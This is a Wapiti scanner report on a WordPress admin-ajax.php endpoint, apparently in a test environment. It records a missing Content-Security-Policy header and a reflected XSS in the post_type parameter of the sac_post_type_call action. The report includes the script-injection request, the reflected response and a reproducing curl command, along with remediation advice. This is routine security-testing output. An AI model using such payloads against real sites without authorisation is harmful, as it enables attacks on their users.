<!DOCTYPE html>
<html>
<head>
	<title>Wapiti scan report</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="css/kube.min.css" />
    <link rel="stylesheet" type="text/css" href="css/master.css" />
</head>
<body>
    <div id="page">
        <header style="text-align: center">
        <h2 class="title" style="text-align: center">Wapiti vulnerability report</h2>
        <h3>Target: http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call</h3>
        <p>Date of the scan: Thu, 21 Mar 2024 21:15:22 +0000. Scope of the scan: folder. Crawled pages: 1</p>
        </header>
        <hr />

        <h4>Summary</h4>
        <table class="width-100 hovered" style="background: url('logo_clear.png') no-repeat center;">
            <thead>
                <tr>
                    <th>Category</th>
                    <th>Number of vulnerabilities found</th>
                </tr>
            </thead>
            <tbody id="summary">
                    <tr>
                        <td class="small">
                            Backup file
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Weak credentials
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            CRLF Injection
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            <a href="#vuln_type_3">Content Security Policy Configuration</a>
                        </td>
                        <td class="small .text-centered">1</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Cross Site Request Forgery
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Potentially dangerous file
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Command execution
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Path Traversal
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Fingerprint web application framework
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Fingerprint web server
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Htaccess Bypass
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            HTML Injection
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            HTTP Secure Headers
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            HttpOnly Flag cookie
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Unencrypted Channels
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Log4Shell
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Open Redirect
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            <a href="#vuln_type_17">Reflected Cross Site Scripting</a>
                        </td>
                        <td class="small .text-centered">1</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Secure Flag cookie
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Spring4Shell
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            SQL Injection
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            TLS/SSL misconfigurations
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Server Side Request Forgery
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Stored HTML Injection
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Stored Cross Site Scripting
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Subdomain takeover
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Blind SQL Injection
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Unrestricted File Upload
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            XML External Entity
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Internal Server Error
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Resource consumption
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Review Webserver Metafiles for Information Leakage
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            Fingerprint web technology
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
                    <tr>
                        <td class="small">
                            HTTP Methods
                        </td>
                        <td class="small .text-centered">0</td>
                    </tr>
            </tbody>
        </table>
        <hr />
        <div id="details">
                <h3 id="vuln_type_3">Content Security Policy Configuration</h3>
                <dl>
                    <dt>Description</dt>
                    <dd>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks.</dd>
                </dl>

                        <h4>ðŸŸ¡ Vulnerability found in /wp-admin/admin-ajax.php</h4>
                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
                            <a href="#tab-vuln-3-0-1" class="is-active">Description</a>
                            <a href="#tab-vuln-3-0-2">HTTP Request</a>
                                <a href="#tab-vuln-3-0-3">HTTP Response</a>
                            <a href="#tab-vuln-3-0-4">cURL command line</a>
                            <a href="#tab-vuln-3-0-5">WSTG Code</a>
                        </nav>
                        <section id="tab-vuln-3-0-1" style="min-height: 124px;">
                            <pre>CSP is not set</pre>
                        </section>
                        <section id="tab-vuln-3-0-2" style="min-height: 124px;" class="is-hidden">
                            <pre style="white-space: normal;">
                                    GET /wp-admin/admin-ajax.php?post_type=fuzz&amp;action=sac_post_type_call HTTP/1.1
                                    <br>
                                    host: web
                                    <br>
                                    connection: keep-alive
                                    <br>
                                    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
                                    <br>
                                    accept-language: en-US,en;q=0.5
                                    <br>
                                    accept-encoding: gzip, deflate, br
                                    <br>
                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
                                    <br>
                                    sec-fetch-user: ?1
                                    <br>
                                    sec-fetch-site: none
                                    <br>
                                    sec-fetch-mode: navigate
                                    <br>
                                    sec-fetch-dest: document
                                    <br>
                                    upgrade-insecure-requests: 1
                                    <br>
                                    dnt: 1
                                    <br>
                            </pre>
                        </section>
                            <section id="tab-vuln-3-0-3" style="min-height: 124px;" class="is-hidden">
                                <pre style="white-space: nowrap">
                                    HTTP 200<br />
                                            date: Thu, 21 Mar 2024 21:17:52 GMT<br />
                                            server: Apache/2.4.57 (Debian)<br />
                                            x-powered-by: PHP/8.2.10<br />
                                            x-robots-tag: noindex<br />
                                            x-content-type-options: nosniff<br />
                                            expires: Wed, 11 Jan 1984 05:00:00 GMT<br />
                                            cache-control: no-cache, must-revalidate, max-age=0<br />
                                            referrer-policy: strict-origin-when-cross-origin<br />
                                            x-frame-options: SAMEORIGIN<br />
                                            content-length: 47<br />
                                            keep-alive: timeout=5, max=100<br />
                                            connection: Keep-Alive<br />
                                            content-type: text/html; charset=UTF-8<br />
                                    <br />
                                    
    &lt;option value=&#34;&#34;&gt;Select Fuzz&lt;/option&gt;
    
                                </pre>
                            </section>
                        <section id="tab-vuln-3-0-4" style="min-height: 124px;" class="is-hidden">
                            <pre>curl &#34;http://web/wp-admin/admin-ajax.php?post_type=fuzz&amp;action=sac_post_type_call&#34;</pre>
                        </section>
                        <section id="tab-vuln-3-0-5" style="min-height: 124px;" class="is-hidden">
                            <pre>[&#39;WSTG-CONF-12&#39;, &#39;OSHP-Content-Security-Policy&#39;]</pre>
                        </section>

                <dl><dt>Solutions</dt><dd>Configuring Content Security Policy involves adding the Content-Security-Policy HTTP header to a web page and giving it values to control what resources the user agent is allowed to load for that page.</dd></dl>
                <h5>References</h5>
                <ul>
                    <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Mozilla: Content Security Policy (CSP)</a></li>
                    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html">OWASP: Content Security Policy Cheat Sheet</a></li>
                    <li><a href="https://owasp.org/www-pdf-archive/2019-02-22_-_How_do_I_Content_Security_Policy_-_Print.pdf">OWASP: How to do Content Security Policy (PDF)</a></li>
                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy">OWASP: Content Security Policy</a></li>
                </ul>
                <br />
                <hr>
                <h3 id="vuln_type_17">Reflected Cross Site Scripting</h3>
                <dl>
                    <dt>Description</dt>
                    <dd>Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications which allow code injection by malicious web users into the web pages viewed by other users. Examples of such code include HTML code and client-side scripts.</dd>
                </dl>

                        <h4>ðŸŸ  Vulnerability found in /wp-admin/admin-ajax.php</h4>
                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
                            <a href="#tab-vuln-17-0-1" class="is-active">Description</a>
                            <a href="#tab-vuln-17-0-2">HTTP Request</a>
                                <a href="#tab-vuln-17-0-3">HTTP Response</a>
                            <a href="#tab-vuln-17-0-4">cURL command line</a>
                            <a href="#tab-vuln-17-0-5">WSTG Code</a>
                        </nav>
                        <section id="tab-vuln-17-0-1" style="min-height: 124px;">
                            <pre>Reflected Cross Site Scripting vulnerability found via injection in the parameter post_type</pre>
                        </section>
                        <section id="tab-vuln-17-0-2" style="min-height: 124px;" class="is-hidden">
                            <pre style="white-space: normal;">
                                    GET /wp-admin/admin-ajax.php?post_type=%3CScRiPt%3Ealert%28%2Fwcoucqklje%2F%29%3C%2FsCrIpT%3E&amp;action=sac_post_type_call HTTP/1.1
                                    <br>
                                    host: web
                                    <br>
                                    connection: keep-alive
                                    <br>
                                    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
                                    <br>
                                    accept-language: en-US,en;q=0.5
                                    <br>
                                    accept-encoding: gzip, deflate, br
                                    <br>
                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
                                    <br>
                                    sec-fetch-user: ?1
                                    <br>
                                    sec-fetch-site: none
                                    <br>
                                    sec-fetch-mode: navigate
                                    <br>
                                    sec-fetch-dest: document
                                    <br>
                                    upgrade-insecure-requests: 1
                                    <br>
                                    dnt: 1
                                    <br>
                            </pre>
                        </section>
                            <section id="tab-vuln-17-0-3" style="min-height: 124px;" class="is-hidden">
                                <pre style="white-space: nowrap">
                                    HTTP 200<br />
                                            date: Thu, 21 Mar 2024 21:15:25 GMT<br />
                                            server: Apache/2.4.57 (Debian)<br />
                                            x-powered-by: PHP/8.2.10<br />
                                            x-robots-tag: noindex<br />
                                            x-content-type-options: nosniff<br />
                                            expires: Wed, 11 Jan 1984 05:00:00 GMT<br />
                                            cache-control: no-cache, must-revalidate, max-age=0<br />
                                            referrer-policy: strict-origin-when-cross-origin<br />
                                            x-frame-options: SAMEORIGIN<br />
                                            vary: Accept-Encoding<br />
                                            content-length: 91<br />
                                            keep-alive: timeout=5, max=97<br />
                                            connection: Keep-Alive<br />
                                            content-type: text/html; charset=UTF-8<br />
                                    <br />
                                    
    &lt;option value=&#34;&#34;&gt;Select &lt;ScRiPt&gt;alert(/wcoucqklje/)&lt;/sCrIpT&gt;&lt;/option&gt;
    
                                </pre>
                            </section>
                        <section id="tab-vuln-17-0-4" style="min-height: 124px;" class="is-hidden">
                            <pre>curl &#34;http://web/wp-admin/admin-ajax.php?post_type=%3CScRiPt%3Ealert%28%2Fwcoucqklje%2F%29%3C%2FsCrIpT%3E&amp;action=sac_post_type_call&#34;</pre>
                        </section>
                        <section id="tab-vuln-17-0-5" style="min-height: 124px;" class="is-hidden">
                            <pre>[&#39;WSTG-INPV-01&#39;]</pre>
                        </section>

                <dl><dt>Solutions</dt><dd>The best way to protect a web application from XSS attacks is ensure that the application performs validation of all headers, cookies, query strings, form fields, and hidden fields. Encoding user supplied output in the server side can also defeat XSS vulnerabilities by preventing inserted scripts from being transmitted to users in an executable form. Applications can gain significant protection from javascript based attacks by converting the following characters in all generated output to the appropriate HTML entity encoding:<, >, &, ', (, ), #, %, ; , +, -</dd></dl>
                <h5>References</h5>
                <ul>
                    <li><a href="https://owasp.org/www-community/attacks/xss/">OWASP: Cross Site Scripting (XSS)</a></li>
                    <li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting">Wikipedia: Cross-site scripting</a></li>
                    <li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation (&#39;Cross-site Scripting&#39;)</a></li>
                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting">OWASP: Reflected Cross Site Scripting</a></li>
                </ul>
                <br />
                <hr>
        </div>
        <footer class="small" id="footer"><a href="https://wapiti-scanner.github.io/" id="wapiti_link">Wapiti 3.1.8</a> &copy; Nicolas SURRIBAS 2006-2022</footer>
	</div>
    <script type="text/javascript" src="js/kube.min.js"></script>
    <script>$K.init();</script>
</body>
</html>